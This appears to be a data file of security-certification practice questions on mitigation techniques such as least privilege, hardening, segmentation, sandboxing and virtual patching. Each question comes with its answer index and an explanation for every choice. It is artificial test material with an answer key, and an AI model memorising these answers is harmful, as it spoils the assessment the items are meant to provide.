{o:"2.5",q:"A database administrator's account can also modify firewall rules and create domain users. The company wants each administrator to hold only the permissions needed for their own role. Which principle applies?",c:["Separation of duties between staff","Least privilege for each role","Job rotation across teams","Mandatory vacation for admins"],a:1,e:["Incorrect. Separation of duties splits one sensitive task among several people. It is related, but the problem here is excess permissions on one account. It fits when one person could both request and approve payments.","Correct. Least privilege grants only the access required for the role, so a database administrator should not hold firewall or directory rights.","Incorrect. Job rotation moves staff between roles so irregularities surface, and it does not trim existing permissions. It fits when fraud detection through role changes is the goal.","Incorrect. Mandatory vacation forces absences so another person can notice misuse, and it does not reduce permissions. It fits when the concern is concealed ongoing fraud."]},
{o:"2.5",q:"A new Linux server is going into production. Which step is part of hardening it before deployment?",c:["Enrolling the server in a backup schedule","Disabling unused services and open ports","Adding the server to SIEM log collection","Writing a disaster recovery runbook for it"],a:1,e:["Incorrect. Backups support recovery and availability but do not reduce the attack surface. It fits when the goal is restoring data after loss or ransomware.","Correct. Hardening reduces attack surface by removing unnecessary services, accounts and open ports and by changing default settings.","Incorrect. Sending logs to a SIEM is a detective control that helps spot attacks and does not shrink exposure. It fits when the goal is monitoring and alerting.","Incorrect. A recovery runbook is planning documentation for continuity and does not change the server's exposure. It fits when preparing for outage response."]},
{o:"2.5",q:"Employees work from home on laptops that rarely connect to the corporate LAN, so perimeter controls never see their traffic. Which mitigation BEST protects these devices?",c:["Endpoint protection on each laptop","Segmentation at the data center edge","Isolation of laptops from the LAN","Decommissioning of unmanaged laptops"],a:0,e:["Correct. Host-based firewalls, HIPS, anti-malware and EDR travel with the laptop and protect it wherever it connects.","Incorrect. Segmentation at the data center edge does not see traffic from laptops that are off the corporate network. It fits for separating server tiers inside the data center.","Incorrect. Isolating laptops from the LAN would cut remote workers off from needed resources. It fits as an emergency step for a compromised device.","Incorrect. Decommissioning removes devices from service, and these laptops are still needed for work. It fits for hardware that is unmanaged and unneeded."]},
{o:"2.5",q:"During deployment, a team changes the default administrator passwords on a batch of network printers and disables SNMPv1 on them. What BEST describes this mitigation?",c:["Encryption of printer traffic","Monitoring of printer activity","Hardening of the printers","Isolation of the printers"],a:2,e:["Incorrect. Nothing in the stem encrypts data in transit or at rest. It fits when print jobs must be protected across the network, for example with IPP over TLS.","Incorrect. Monitoring watches for activity and alerts, while these changes remove weaknesses directly. It fits when you need visibility into printer behavior.","Correct. Replacing default credentials and turning off insecure legacy services are basic hardening steps that reduce attack surface.","Incorrect. The printers remain on the network and are not cut off from it. It fits when a compromised device must be contained."]},
{o:"2.5",q:"A SOC deploys a SIEM with analysts reviewing alerts 24/7 to catch threats that evade preventive controls. Which mitigation is this?",c:["Segmentation of the SOC network","Patching of the SIEM servers","Decommissioning of old log sources","Monitoring and alerting on events"],a:3,e:["Incorrect. Segmentation separates networks to limit movement and does not detect threats. It fits when you need to restrict which systems can reach each other.","Incorrect. Patching the SIEM keeps the platform secure but does not itself provide detection of threats elsewhere. It fits when a known vulnerability exists in the SIEM software.","Incorrect. Decommissioning log sources would reduce visibility rather than add it. It fits when a system is retired and its logging is no longer needed.","Correct. Monitoring and alerting provide visibility and detection when preventive controls fail, which is the SOC's stated purpose here."]},
{o:"2.5",q:"A salesperson's laptop containing a customer database is stolen from a car. Which control, already in place, would have BEST protected the data?",c:["Network segmentation of the sales VLAN","Full-disk encryption with TPM","ACLs on the CRM file server","Application allow listing on laptops"],a:1,e:["Incorrect. Segmentation controls network paths and does nothing for a device that is physically gone. It fits when limiting lateral movement between VLANs.","Correct. Full-disk encryption makes the drive unreadable without the key, so a thief cannot recover the local database even by moving the disk to another machine.","Incorrect. Server ACLs govern access to the server's resources, not the copy already stored on the laptop. It fits when controlling who can open files on the file server.","Incorrect. Allow listing restricts what runs on the laptop, but a thief can mount the drive elsewhere and read it. It fits when blocking unapproved programs from executing."]},
{o:"2.5",q:"A manufacturing controller runs an operating system the vendor no longer patches, yet it is required for production for two more years. Which mitigation is MOST appropriate?",c:["Upgrade it in place during production hours","Move it to a DMZ with a public address","Segment it and restrict access to one jump host","Install an EDR agent and keep it on the flat LAN"],a:2,e:["Incorrect. An in-place upgrade during production risks downtime for a system the business needs running. It fits when a maintenance window and vendor support exist.","Incorrect. A DMZ with a public address exposes an unpatched system to the internet. It fits for hardened, patched services that must be reachable from outside.","Correct. Isolating an unpatchable system and tightly limiting access reduces its exposure as a compensating control until it can be replaced.","Incorrect. EDR agents often do not support end-of-life operating systems, and leaving the controller on a flat LAN keeps it reachable by everything. It fits for supported endpoints."]},
{o:"2.5",q:"The last rule of a firewall policy blocks any traffic not explicitly permitted by an earlier rule. Which concept is this?",c:["Implicit deny at the end of the ACL","Discretionary access control by owners","Role-based access control by job","Mandatory access control by labels"],a:0,e:["Correct. Implicit deny blocks anything not explicitly allowed and is normally the final rule in an ACL.","Incorrect. DAC lets resource owners decide who may access their objects and is not a default firewall rule. It fits when file owners grant access themselves.","Incorrect. RBAC assigns permissions according to job roles and does not describe a final catch-all firewall rule. It fits when access should follow job function.","Incorrect. MAC enforces access using classification labels set by the system, not a default block rule. It fits in high-security environments with clearance levels."]},
{o:"2.5",q:"A mail administrator wants to stop messages from three known phishing domains this week while leaving all other mail flowing, with minimal administrative effort. Which technique fits?",c:["Allow list of approved senders","S/MIME signing for all outbound mail","Sandbox detonation of every attachment","Deny list for the known bad domains"],a:3,e:["Incorrect. An allow list would block every sender not on it, disrupting normal mail. It fits when only a small, fixed set of senders should be trusted.","Incorrect. S/MIME signing proves the authenticity of your own outbound mail and does not block inbound phishing. It fits when recipients must verify who sent a message.","Incorrect. Sandboxing attachments is heavy-weight and addresses malicious files, not senders from known domains. It fits when unknown attachments need behavioral analysis.","Correct. A deny list blocks specific known-bad items and permits everything else, which matches a quick block of three domains."]},
{o:"2.5",q:"An organization wants unknown executables arriving by email to run in a contained environment for observation before they reach users. Which technique is this?",c:["Allow listing of attachments","Tokenization of sensitive fields","Sandboxing of email attachments","Segmentation of the mail server"],a:2,e:["Incorrect. Allow listing would simply block unknown files and would not observe their behavior. It fits when only approved file types or hashes should pass.","Incorrect. Tokenization replaces sensitive data with surrogate values and has nothing to do with analyzing executables. It fits when protecting card numbers in a database.","Correct. Sandboxing detonates untrusted code in isolation so its behavior can be observed without risk to users.","Incorrect. Segmentation separates network zones and does not analyze attachments. It fits when you need to limit what the mail server can reach."]},
{o:"2.5",q:"A company wants to reduce the risk that a single administrator can push a malicious firewall change without anyone noticing. Which pair of controls BEST addresses this?",c:["Disk encryption with secure boot on admin PCs","Dual approval with peer-reviewed audit logs","WPA3-Enterprise with certificate-based 802.1X","Longer passwords with phishing-resistant MFA"],a:1,e:["Incorrect. Disk encryption and secure boot protect data and boot integrity on a lost or tampered PC, not what a legitimate administrator does. It fits when theft or firmware tampering is the risk.","Correct. Requiring a second person to approve changes, plus logs someone else reviews, makes malicious changes by one administrator hard to hide.","Incorrect. WPA3-Enterprise and 802.1X secure who joins the wireless network and do not constrain administrator actions. It fits when wireless access must be authenticated.","Incorrect. Stronger credentials stop outsiders impersonating the admin, but the admin here is legitimate. It fits when account takeover is the threat."]},
{o:"2.5",q:"A building's IoT HVAC controller must stay online so the vendor can monitor it, but it must not provide a path into the corporate network. What should be done?",c:["Put it on its own VLAN with vendor-only access","Air-gap it by unplugging its network link","Join it to the corporate VLAN with a host firewall","Share the HR server VLAN behind host firewalls"],a:0,e:["Correct. A dedicated segment with tightly restricted flows keeps the device reachable for the vendor while removing a path to corporate systems. The Target breach began through an HVAC vendor.","Incorrect. An air gap removes connectivity entirely, but the stem requires the controller to stay online for vendor monitoring. It fits when a device does not need any network access.","Incorrect. Placing it on the corporate VLAN gives a compromised controller direct reach to corporate hosts, and a host firewall on a device like this is rarely feasible. It fits for managed, trusted endpoints.","Incorrect. Sharing the HR server VLAN gives the controller a network path to sensitive servers. It fits only for systems that belong with those servers."]},
{o:"2.5",q:"A vendor patch is available for a critical remote-code-execution flaw actively exploited against your product version, and the next quarterly patch window is 10 weeks away. What should the organization do?",c:["Test briefly, then deploy as an emergency change","Add a WAF signature and patch at the quarterly window","Roll the patch out to a pilot group over four weeks","Accept the risk through a signed exception form"],a:0,e:["Correct. An actively exploited critical flaw with an available fix justifies an emergency change: a quick test, then fast deployment outside the normal cycle.","Incorrect. A WAF signature is a compensating control that helps when no patch exists or it cannot be applied. Here a fix exists and exploitation is active, so waiting 10 weeks is too long.","Incorrect. A four-week phased rollout suits routine patches, but it leaves most systems exposed while attackers are already exploiting the flaw. It fits for lower-severity updates.","Incorrect. Risk acceptance is legitimate for low risks or when fixes are impractical, but accepting an actively exploited critical flaw with a ready fix is not defensible. It fits when cost outweighs impact."]},
{o:"2.5",q:"Leadership wants a control that still protects customer records if an attacker bypasses the network defenses and reaches the database server's disks. Which technique fits?",c:["Stricter ACLs on the perimeter firewall","Network segmentation of the database tier","Encryption at rest with keys in an HSM","Continuous monitoring with SIEM correlation"],a:2,e:["Incorrect. Perimeter ACLs are network controls, and the scenario assumes they were already bypassed. It fits when you want to restrict which sources can connect.","Incorrect. Segmentation is also a network control that the attacker has already bypassed, and it does not protect data on the disks. It fits when limiting how far a breach can spread.","Correct. Encrypting data at rest, with keys held separately in an HSM, protects the records themselves even after network controls have failed. This is defense in depth.","Incorrect. Monitoring can detect the intrusion but does not make the stolen data unreadable. It fits when the goal is to alert responders quickly."]},
{o:"2.5",q:"Help-desk staff browse the web and read email with accounts in Domain Admins. The company moves them to standard daily accounts and issues separate admin accounts used only for elevated tasks. Which principle is this?",c:["Configuration enforcement of GPO baselines","Decommissioning of dormant admin accounts","Least privilege and account separation","Monitoring of privileged group membership"],a:2,e:["Incorrect. Configuration enforcement corrects drift in system settings and does not change who holds privileges. It fits when local settings are being weakened.","Incorrect. Decommissioning removes accounts that are no longer needed, while these admin accounts remain in use. It fits when employees leave or roles end.","Correct. Daily accounts get minimal rights and admin rights are used only when needed, which limits the damage if a daily account is phished.","Incorrect. Monitoring alerts on changes to privileged groups but leaves the excessive daily-use privileges in place. It fits when detecting unauthorized group membership changes."]},
{o:"2.5",q:"A legacy ERP application has a known SQL injection flaw, the vendor will not ship a fix for six months, and the business needs it running. Which mitigation BEST reduces risk in the meantime?",c:["Decommissioning of the ERP application","Virtual patching using a WAF rule set","Full-disk encryption on the server","Moving the server to its own VLAN"],a:1,e:["Incorrect. Decommissioning would remove a system the business needs. It fits when an application is no longer used and can be retired.","Correct. A WAF rule that blocks injection patterns compensates for the unpatched flaw while the application stays in service.","Incorrect. Full-disk encryption protects data at rest on a stolen disk and does nothing against SQL injection through the running application. It fits when theft of the server is the risk.","Incorrect. A separate VLAN limits spread after compromise, but attackers can still reach the application and exploit the flaw through its normal interface. It fits for containing legacy hosts."]},
{o:"2.5",q:"An organization disables SMBv1, LLMNR and TLS 1.0 on all systems through Group Policy. Which activity BEST describes this?",c:["Decommissioning of outdated servers","Encryption of network data in transit","Hardening that disables old protocols","Isolation of the vulnerable hosts"],a:2,e:["Incorrect. The servers stay in service and only certain protocols are turned off. It fits when hosts are retired and removed.","Incorrect. Disabling TLS 1.0 forces newer versions but does not newly encrypt anything, and SMBv1 and LLMNR are not encryption features. It fits when enabling TLS or IPsec for traffic.","Correct. Turning off insecure legacy protocols reduces attack surface and is a core hardening step.","Incorrect. The hosts remain connected and reachable, so nothing is isolated. It fits when a vulnerable or compromised host is cut off from the network."]}
]);
